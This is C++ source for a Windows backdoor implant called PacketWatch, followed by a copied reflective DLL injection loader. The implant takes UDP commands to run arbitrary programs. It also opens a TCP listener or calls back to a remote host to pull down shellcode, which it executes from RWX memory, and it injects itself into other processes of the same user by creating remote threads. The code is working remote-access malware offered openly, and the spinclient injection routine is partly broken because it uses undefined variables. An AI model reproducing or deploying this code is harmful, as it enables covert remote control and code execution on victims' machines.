
#include "stdafx.h"
#include "packetwatch.h"
#include <ctime>
#include <Windows.h>
#include <psapi.h>
#include <random>

#pragma comment (lib, "Ws2_32.lib")

PacketWatch::PacketWatch()
{
	master = false;
}

PacketWatch::~PacketWatch()
{
}

void packetwatch_trampoline(PacketWatch *p) {
	std::cout << "trampoline with pointer of" << p << "\n";
	p->mymain(NULL);
}

void PacketWatch::start()
{
	std::cout << "starting PacketWatch Thread\n";
	mythread = CreateThread(
		NULL,
		0,
		(PTHREAD_START_ROUTINE)packetwatch_trampoline,
this,
0,
0
);
}

DWORD WINAPI PacketWatch::mymain(LPVOID lpParam)
{
	//I am the master of the thread created in start
	// Note that the udp socket example is from: 
	// https://social.msdn.microsoft.com/Forums/en-US/f7402dfa-405c-4b6d-95d8-3d10530d8120/using-server-and-a-client-with-udp?forum=Vsexpressvc


	//Init Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

SOCKET socketS;

struct sockaddr_in local;
struct sockaddr_in from;
struct sockaddr_in serverInfo;
int srvlen = sizeof(serverInfo);
int fromlen = sizeof(from);

timeval timeout;
timeout.tv_sec = 5;

clock_t lpsawt;
int failcount = 0;
lpsawt = clock();

FD_SET fds;
int total;

socketS = 0;

master = false;

//for debugging
std::cout << "Starting Client\n";
spinclient();

while (1 == 1) {



	if (!socketS) {  // Need to test if socket is stilll good here.
		socketS = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  // Not sure why protocol parm is zero, but from example so going with it.

		if (master == TRUE) {
			//would connect, but udp doesn't need to.
		}
		else {
			local.sin_family = AF_INET;
			local.sin_port = htons(9999);
			local.sin_addr.s_addr = INADDR_ANY;

			if (bind(socketS, (sockaddr*)&local, sizeof(local)) == SOCKET_ERROR) {
				std::cout << "bind failed.\n";
				//possibly become master, possibly quit.  for now zero the socket.
				closesocket(socketS);
				socketS = 0;
				Sleep(5000);
			}
		}
	}



	//MessageBox(NULL, (LPCWSTR)L"Thread Ran", (LPCWSTR)L"Caption", MB_OK);
	//std::cout << "PacketWatch::mymain Thread Ran\n";
	//Sleep(5000);

	if (socketS) {

		if (master) {

			std::cout << "Loop as Master\n";
			//connect to the client on localhost 9999
			serverInfo.sin_family = AF_INET;
			serverInfo.sin_port = htons(9999);

			char destinationstr[] = "127.0.0.1";
			InetPtonA(AF_INET, destinationstr, (VOID *)&(serverInfo.sin_addr));

			strncpy_s(buffer, 2048, "Master Lives\x00", sizeof("Master Lives\x00"));


			//This result should be failing when the port isn't listening.  Why isn't it?

			int result = sendto(socketS, buffer, strlen(buffer), 0, (sockaddr *)&serverInfo, srvlen);
			if (result == SOCKET_ERROR) {
				if (WSAGetLastError() == WSAECONNRESET) {
					//Assuming reset error is correct.
					//spin up another client.
					std::cout << "Starting a client.\n";
					failcount = 0;
					lpsawt = clock();
					spinclient();
				}
				else {
					std::cout << "Socket error that wasn't connreset.\n";
				}
			}
			else {
				//Master is looking for heartbeat response.
				FD_ZERO(&fds);
				FD_SET(socketS, &fds);

				if ((total = select(100, &fds, NULL, NULL, &timeout) == SOCKET_ERROR)) {
					std::cout << "Select failed.\n";
				}

				if (FD_ISSET(socketS, &fds)) {
					if (recvfrom(socketS, buffer, sizeof(buffer), 0, (sockaddr *)&serverInfo, &srvlen) != SOCKET_ERROR) {
						std::cout << "Heartbeat Response: " << buffer << "\n";
						failcount = 0;
						lpsawt = clock();
					}
					else {
						int lasterror = WSAGetLastError();

						if (lasterror == WSAECONNRESET) {
							failcount++;
							if (failcount > 5) {
								std::cout << "Starting a client.\n";
								failcount = 0;
								lpsawt = clock();
								spinclient();
							}
						}
						else {
							std::cout << "Got Socket Error reading hearbeat response. (wasn't connection reset) Error is: " << WSAGetLastError() << "\n";
						}
					}
				}
				else {
					float elapsed = (clock() - lpsawt) / CLOCKS_PER_SEC;
					std::cout << "Elapsed is: " << elapsed << "\n";
					if (elapsed > 5) {
						if (failcount > 4) {
							//Missed Heartbeat response too many times.
							failcount = 0;
							lpsawt = clock();
							std::cout << "Packetwait - Heart failed, spinning client.\n";
							spinclient();
						}
						else {
							lpsawt = clock();
							failcount++;
							std::cout << "Packetwait - Hearbeat response has failed " << failcount << " times.\n";
						}
					}
				}

//				std::cout << "Sendto result was: " << result << "\n";
				//Master only sends packets every once in a while.

				if (failcount > 5) {
					std::cout << "Starting a client.\n";
					failcount = 0;
					lpsawt = clock();
					spinclient();
				}
				Sleep(5000);
			}
		}
		else {

				ZeroMemory(buffer, sizeof(buffer));
				//std::cout << "PacketWait - Waiting for packet.\n";

				//This is stuff left over where trying to do select stuff.
				//https://stackoverflow.com/questions/9596014/select-sometimes-does-not-wait
				//Have to do a lastpacketseenatwhattime scenario

				FD_ZERO(&fds);
				FD_SET(socketS, &fds);

				if ((total = select(100, &fds, NULL, NULL, &timeout) == SOCKET_ERROR)) {
					std::cout << "Select failed.\n";
				}

				if (FD_ISSET(socketS, &fds)) {
					std::cout << "Got Packet per select.\n";

					if (recvfrom(socketS, buffer, sizeof(buffer), 0, (sockaddr *)&from, &fromlen) != SOCKET_ERROR)
					{
						if (strncmp(buffer, "Master Lives", strlen("Master Lives")) == 0) {
							failcount = 0;
							lpsawt = clock();
							std::cout << "Master heart received\n";
							strncpy_s(buffer, 2048, "Hi Master\x00", sizeof("Hi Master\x00"));
							sendto(socketS, buffer, sizeof(buffer), 0, (sockaddr *)&from, fromlen);
						}
						else if (strncmp(buffer, "action_1", strlen("action_1")) == 0) {
							action_1();
						}
						else if (strncmp(buffer, "action_2", strlen("action_2")) == 0) {
							action_2();
						}
						else if (strncmp(buffer, "exec ", strlen("exec ")) == 0) {
							RunCommand();
						}
						else if (strncmp(buffer, "tcp ", strlen("tcp ")) == 0) {
							OpenTCPPayloadListener();
						}
						else if (strncmp(buffer, "tcpback ", strlen("tcpback ")) == 0) {
							SetUpBackCaller(buffer);
						}
						else {
							std::cout << "PacketWait - Got an unknown packet\n";
							std::cout << "Buffer: " << buffer << "\n";
						}
					}
				}
				else {
					//Select returned without a recv packet.  Could be a timeout.
					if (((clock() - lpsawt) / CLOCKS_PER_SEC) > 5) {
						if (failcount > 4) {
							//Missed Master too many times.
							//I am now master. Note that socketS = 0 will spin up client when 
							closesocket(socketS);
							socketS = 0;
							failcount = 0;
							master = true;
							std::cout << "Packetwait - Master assumed.\n";
							lpsawt = clock();
						}
						else {
							lpsawt = clock();
							failcount++;
							std::cout << "Packetwait - Hearbeat has failed " << failcount << " times.\n";
						}
					}
					else {
					//	std::cout << "Select but no timeout.  lpsawd: " << lpsawt << " Clock: " << clock() << "\n";
					}
				}
			}
		}
		else {
			std::cout << "Packetwait probably not master\n";
		}
	}
	closesocket(socketS);
	return 0;
}

void PacketWatch::action_1() {
	std::cout << "Action 1 initiated\n";
}

void PacketWatch::action_2() {
	std::cout << "Action 2 initiated\n";
}


void TCPThread(int *port) {
	std::cout << "TCPThread for port " << *port << "\n";
	//Bind Socket
	SOCKET socketS;

	struct sockaddr_in local;
	struct sockaddr_in from;
	int fromlen = sizeof(from);
	local.sin_family = AF_INET;
	local.sin_port = htons(*port);
	local.sin_addr.s_addr = INADDR_ANY;

	socketS = socket(AF_INET, SOCK_STREAM, 0);  // Not sure why protocol parm is zero, but from example so going with it.
	bind(socketS, (sockaddr *)&local, sizeof(local));

	// Listen for connections
	int iResult = listen(socketS, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		std::cerr << "listen failed with error: " << WSAGetLastError() << "\n";
		closesocket(socketS);
		return;
	}

	// Accept a client socket
	SOCKET ClientSocket = accept(socketS, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		std::cerr << "accept failed with error:" << WSAGetLastError() << "\n";
		closesocket(socketS);
		return;
	}

	// Receive the payload
	/* read the 4-byte length */
	int size;
	int count = recv(ClientSocket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		std::cerr << "read a strange or incomplete length value\n";
	
	/* allocate a RWX buffer */ 
	char *buffer = (char *)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
	
	if (buffer == NULL)
		std::cerr << "could not allocate buffer\n";
	
	/* prepend a little assembly to move our SOCKET value to the EDI register
	thanks mihi for pointing this out    
	BF 78 56 34 12     =>      mov edi, 0x12345678 
	*/
	
	buffer[0] = (char) 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &ClientSocket, 4);

	/* read bytes into the buffer */
	int total = 0;
	while (total < size) {
		count = recv(ClientSocket, buffer + 5 + total, size-total, 0);
		total += count;
	}
	
	/* cast our buffer as a function and call it */
	void(*fp)();
	fp = (void(*)())buffer;
	fp();
}

void BackCallerThread(sockaddr_in *remote) {

	SOCKET socketS;
	int payloadsize;
	char *buffer;

	std::cout << "Made it to the backcaller thread with a port of " << ntohs(remote->sin_port) << "\n";

	socketS = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  // Not sure why protocol parm is zero, but from example so going with it.


	//connect
	if (connect(socketS, (struct sockaddr *)remote, sizeof(sockaddr_in))) {
		std::cerr << "Error connecting to host.  Error: " << WSAGetLastError() << "\n";
		return;
	}

	//recv size
	int count = recv(socketS, (char *)&payloadsize, 4, 0);

	//Alloc bufferspace
	buffer = (char *)VirtualAlloc(0, payloadsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//put code to set edi to socket
	buffer[0] = (char)0xBF;

	//copy the value of our socket to the buffer
	memcpy(buffer + 1, &socketS, 4);


	//recv payload
	int total = 0;
	while (total < payloadsize) {
		count = recv(socketS, buffer + 5 + total, payloadsize - total, 0);
		total += count;
	}

	//call payload (plus edi code)
	void(*fp)();
	fp = (void(*)())buffer;
	fp();
    //Note that if the payload calls exit process (default... this app will exit).  Would be nice to avoid that, but don't know how.
}


void PacketWatch::SetUpBackCaller(char *buffer) {
	//Parse Buffer for connection information
	sockaddr_in *destination;
//	struct hostent *he;
	destination = new sockaddr_in;

	ZeroMemory(destination, sizeof(sockaddr_in));

	//Parse buffer for ip and port
	char *destinationhost = strstr(buffer, " ") + 1;  //Skip past tcpback keyword
	char *portnumstr = strstr(destinationhost, " ") + 1;
	portnumstr[-1] = (char)0; //puts a null over the space (to null terminate the hostname
	portnumstr[strlen(portnumstr) - 1] = (char)0; // Kill the newline char


	std::cout << "Connecting to " << destinationhost << " on port " << portnumstr << "\n";
	/* resolve hostname */
	//if ((he = gethostbyname(destinationhost)) == NULL) {
	//	std::cerr << "Couldn't resolve hoststring\n";
	//	return;
	//}

	/* copy the network address to sockaddr_in structure */
	//memcpy((void *) &(destination->sin_addr), he->h_addr_list[0], he->h_length);
//	destination->sin_addr.s_addr = inet_addr(destinationhost);

	//UNTESTED - inet_addr is suddenly deprectaed.
	InetPton(AF_INET, (PCWSTR)(destinationhost), (VOID *)&(destination->sin_addr));
	destination->sin_port = htons(atoi(portnumstr)); 
	destination->sin_family = AF_INET;

	//Create Thread for Listener
	HANDLE tcpthread = CreateThread(
		NULL,
		0,
		(PTHREAD_START_ROUTINE)BackCallerThread,
		(LPVOID)destination,
		0,
		0
	);



}

void PacketWatch::OpenTCPPayloadListener() {
	//Parse buffer for port number
	int *portnum;

	char *portnumstr = strstr(buffer, " ");  //Skip past tcp keyword
	portnumstr[strlen(portnumstr) - 1] = (char)0; // Kill the newline char
	portnumstr++; //goto char after ' '

	portnum = new int;
	*portnum = atoi(portnumstr);

	std::cout << "Attempting to listen for payload on port " << *portnum << "\n";

	//Create Thread for Listener
	HANDLE tcpthread = CreateThread(
		NULL,
		0,
		(PTHREAD_START_ROUTINE)TCPThread,
		(LPVOID) portnum,
		0,
		0
	);
}

void PacketWatch::OpenUDPPayloadListener() {

}

void PacketWatch::RunCommand() {
	//Parse Buffer
	//Just read "The system adds a terminating null character to the command-line string to separate the file name from the arguments. This divides the original string into two strings for internal processing."
	char *command = strstr(buffer, " "); //skips past exec keyword
	command[strlen(command)-1] = (char)0; //Kill the newline char
	command++;
	//char* commandline = strstr(commandend, " "); //skips past executable name

	//Execute Command
	//Notes:
	//Must include the full pathname... no path searching
	//must include extension.
	//To run a batch file, you must start the command interpreter; set lpApplicationName to cmd.exe and set lpCommandLine to the following arguments: /c plus the name of the batch file.
	//StartupInfo supports pipes...  Would be nice to put output into the socket and see results.
	std::cout << "Attempting to execute: " << command << "\n";
	
	//stuff needed to run
	//From https://docs.microsoft.com/en-us/windows/desktop/ProcThread/creating-processes
	PROCESS_INFORMATION pi;
	STARTUPINFOA si; //sets handles for child process.  would be interesting to use the socket for this, but not sure I know how.
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ZeroMemory(&pi, sizeof(pi));

 	if (!CreateProcessA(
		NULL, //Command to run
		command, //Commandline
		0, //process security attributes... may need to carry uac to child here... don't know
		0, //thread Attributes
		FALSE, //Inherit handles
		0, //Creation Flags (priority)
		0, //Environment Null=use same environment as calling process
		0, // working directory, null is same as current process 
		&si, //StartupInfo
		&pi  //process information
		))
	{
		std::cout << "CreateProcess failed: " << GetLastError() << "\n";
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	
}


bool compatible(HANDLE hProcess) {
	//look for process that matches my current level.
	//user or SYSTEM

	HANDLE myToken, TargetToken;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &myToken)) {
		std::cout << "Couldn't get my own token.\n";
		return false;
	}

	if (!OpenProcessToken(hProcess, TOKEN_READ, &TargetToken)) {
		std::cout << "Couldn't open target token.\n";
		return false;
	}

	wchar_t targetusername[256];
	

	DWORD dwProcessTokenInfoAllocSize = 0;
	GetTokenInformation(TargetToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);

	// Call should have failed due to zero-length buffer.
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		// Allocate buffer for user information in the token.
		PTOKEN_USER pUserToken = (TOKEN_USER *)malloc(dwProcessTokenInfoAllocSize);
		if (pUserToken != NULL)
		{
			// Now get user information in the allocated buffer
			if (GetTokenInformation(TargetToken, TokenUser, pUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
			{
				// Some vars that we may need
				SID_NAME_USE   snuSIDNameUse;
				TCHAR          szUser[MAX_PATH] = { 0 };
				DWORD          dwUserNameLength = MAX_PATH;
				TCHAR          szDomain[MAX_PATH] = { 0 };
				DWORD          dwDomainNameLength = MAX_PATH;

				// Retrieve user name and domain name based on user's SID.
				if (::LookupAccountSid(NULL,
					pUserToken->User.Sid,
					szUser,
					&dwUserNameLength,
					szDomain,
					&dwDomainNameLength,
					&snuSIDNameUse))
				{

					// We succeeded
					_snwprintf_s(targetusername, 256, L"\\\\%s\\%s", szDomain, szUser);
					

				}//End if
			}// End if
			free(pUserToken);
		}// End if
	}// End if

	wchar_t myusername[256];
	dwProcessTokenInfoAllocSize = 0;
	GetTokenInformation(myToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);

	// Call should have failed due to zero-length buffer.
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		// Allocate buffer for user information in the token.
		PTOKEN_USER pmyUserToken = (TOKEN_USER *)malloc(dwProcessTokenInfoAllocSize);
		if (pmyUserToken != NULL)
		{
			// Now get user information in the allocated buffer
			if (GetTokenInformation(myToken, TokenUser, pmyUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
			{
				// Some vars that we may need
				SID_NAME_USE   snuSIDNameUse;
				TCHAR          szUser[MAX_PATH] = { 0 };
				DWORD          dwUserNameLength = MAX_PATH;
				TCHAR          szDomain[MAX_PATH] = { 0 };
				DWORD          dwDomainNameLength = MAX_PATH;

				// Retrieve user name and domain name based on user's SID.
				if (::LookupAccountSid(NULL,
					pmyUserToken->User.Sid,
					szUser,
					&dwUserNameLength,
					szDomain,
					&dwDomainNameLength,
					&snuSIDNameUse))
				{
					_snwprintf_s(myusername, 256, L"\\\\%s\\%s", szDomain, szUser);
					// We succeeded
					std::wcout << "Process user: " << targetusername << " My User: " << myusername << "\n";

					if (wcscmp(targetusername, myusername) == 0) {
						free(pmyUserToken);
						CloseHandle(TargetToken);
						CloseHandle(myToken);
						return true;
					}
				}//End if
			}// End if
			free(pmyUserToken);
		}// End if
	}// End if

	CloseHandle(TargetToken);
	CloseHandle(myToken);

	return false;
}


int PacketWatch::pickprocess() {
	//Get a process list?
	DWORD list[1024], cbneeded, cProcesses;
	
	if (!EnumProcesses(list, sizeof(list), &cbneeded)) {
		std::cout << "EnumProcesses failed.\n";
	}

	cProcesses = cbneeded / sizeof(DWORD);

	DWORD iter;
	int potentialcount = 0;
	DWORD potentials[1024];

	HANDLE hProcess;

	std::cout << "Found " << cProcesses << " processes.\n";

	for (iter = 0; iter < cProcesses; iter++) {
		//Need to weed out potentials.
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, list[iter]);
		if (hProcess != NULL) {
			HMODULE hmod;
			if (compatible(hProcess)) {
				potentials[potentialcount] = list[iter];
				potentialcount++;
			}
		}
		else {
			std::cout << "Opening pid: " << list[iter] << " failed.\n";
		}
		CloseHandle(hProcess);
	}

	std::cout << "Found " << potentialcount << " eligible processes.\n";

	srand((unsigned)time(NULL));
	int ran = rand() % potentialcount;
	std::cout << "Picket pid: " << potentials[ran] << ".\n";

	return potentials[ran];
}

void PacketWatch::spinclient() {

	HANDLE hProcess;
	HANDLE hThread;
	LPVOID lpRemoteLibraryBuffer = NULL;
	DWORD dwLength;


	//Pick process
	int pid = pickprocess();

	//Attach to process
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);

	if (hProcess != NULL) {
		int dllLength = 100;
		void *lpBuffer = HeapAlloc(GetProcessHeap(), 0, dllLength);

		// alloc memory (RWX) in the host process for the image...
		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			return;

		// write the image into the host process...
		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
			return;
		
		// code from metasploit implies there should be a fuction REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);
	}


}

//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "LoadLibraryR.h"
//===============================================================================================//
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset(VOID * lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
#ifdef _WIN64
	DWORD dwMeterpreterArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwMeterpreterArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has  
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwMeterpreterArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwMeterpreterArch != 2)
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
//===============================================================================================//
// Loads a DLL image from memory via its exported ReflectiveLoader function
HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength)
{
	HMODULE hResult = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwOldProtect1 = 0;
	DWORD dwOldProtect2 = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain = NULL;

	if (lpBuffer == NULL || dwLength == 0)
		return NULL;

	__try
	{
		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
		if (dwReflectiveLoaderOffset != 0)
		{
			pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			// we must VirtualProtect the buffer to RWX so we can execute the ReflectiveLoader...
			// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region
			if (VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1))
			{
				// call the librarys ReflectiveLoader...
				pDllMain = (DLLMAIN)pReflectiveLoader();
				if (pDllMain != NULL)
				{
					// call the loaded librarys DllMain to get its HMODULE
					// Dont call DLL_METASPLOIT_ATTACH/DLL_METASPLOIT_DETACH as that is for payloads only.
					if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
						hResult = NULL;
				}
				// revert to the previous protection flags...
				VirtualProtect(lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2);
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		hResult = NULL;
	}

	return hResult;
}
//===============================================================================================//
// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
// Note: You must compile whatever you are injecting with REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 
//       defined in order to use the correct RDI prototypes.
// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
// Note: This function currently cant inject accross architectures, but only to architectures which are the 
//       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;

	__try
	{
		do
		{
			if (!hProcess || !lpBuffer || !dwLength)
				break;

			// check if the library has a ReflectiveLoader...
			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
			if (!dwReflectiveLoaderOffset)
				break;

			// alloc memory (RWX) in the host process for the image...
			lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
				break;

			// write the image into the host process...
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
				break;

			// add the offset to ReflectiveLoader() to the remote library address...
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

			// create a remote thread in the host process to call the ReflectiveLoader!
			hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);

		} while (0);

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		hThread = NULL;
	}

	return hThread;
}
//===============================================================================================//